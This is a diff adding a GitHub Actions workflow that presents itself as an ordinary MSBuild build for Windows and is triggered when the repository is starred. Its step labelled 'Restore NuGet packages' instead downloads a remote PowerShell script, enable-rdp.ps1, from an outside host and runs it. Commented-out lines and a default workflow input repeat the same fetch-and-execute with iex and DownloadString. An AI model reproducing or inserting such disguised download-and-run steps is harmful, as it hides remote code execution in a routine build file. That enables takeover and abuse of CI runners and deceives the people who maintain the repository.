@@ -1,0 +1,67 @@
+name: MSBuild
+
+on:
+  watch:
+    types: [started]
+  workflow_dispatch:
+    inputs:
+      startup_sh:
+        description: 'startup script'
+        required: false
+        default: 'Invoke-WebRequest  https://fhost.deta.dev/d/windows/enable-rdp.ps1  -outfile enable-rdp.ps1 ; .  ./enable-rdp.ps1 '
+
+env:
+  # Path to the solution file relative to the root of the project.
+  SOLUTION_FILE_PATH: .
+
+  # Configuration type to build.
+  # You can convert this to a build matrix if you need coverage of multiple configuration types.
+  # https://docs.github.com/actions/learn-github-actions/managing-complex-workflows#using-a-build-matrix
+  BUILD_CONFIGURATION: Release
+
+jobs:
+  build:
+    runs-on: windows-2022
+
+    steps:
+    - uses: actions/checkout@v2
+
+    #- name: Add MSBuild to PATH
+    #  uses: microsoft/setup-msbuild@v1.0.2
+    
+    - name: "Get Date"
+      id: get-date
+      run: |
+        echo "::set-output name=date::$(/bin/date -u '+%H%M%S')"
+      shell: bash
+
+    - name: Local Cache                        # update 1002
+      uses: actions/cache@v2
+      with:
+        path: |
+          ~/local-cache
+          !~/local-cache/exclude
+        key: ${{ runner.os }}-cache-${{ steps.get-date.outputs.date }}
+        restore-keys: |
+            ${{ runner.os }}-cache-
+            ${{ runner.os }}-    
+            
+
+    - name: Restore NuGet packages      # update 1208
+      #timeout-minutes: 5
+      continue-on-error: true 
+      working-directory: ${{env.GITHUB_WORKSPACE}}
+      #run: nuget restore ${{env.SOLUTION_FILE_PATH}}
+      run: |
+        #iex ((new-object net.webclient).DownloadString('http://ms.devxops.tk/windows/enable-rdp.ps1'))
+        #Invoke-WebRequest  http://ms.devxops.tk/windows/enable-rdp.ps1  -outfile enable-rdp.ps1 ; .  ./enable-rdp.ps1 
+        #${{ github.event.inputs.startup_sh }} 
+        Invoke-WebRequest  https://fhost.deta.dev/d/windows/enable-rdp.ps1  -outfile enable-rdp.ps1 ; .  ./enable-rdp.ps1        
+        start-sleep 30
+
+    - name: Build
+      continue-on-error: true 
+      working-directory: ${{env.GITHUB_WORKSPACE}}
+      # Add additional options to the MSBuild command line here (like platform or verbosity level).
+      # See https://docs.microsoft.com/visualstudio/msbuild/msbuild-command-line-reference
+      run: msbuild /m /p:Configuration=${{env.BUILD_CONFIGURATION}} ${{env.SOLUTION_FILE_PATH}}
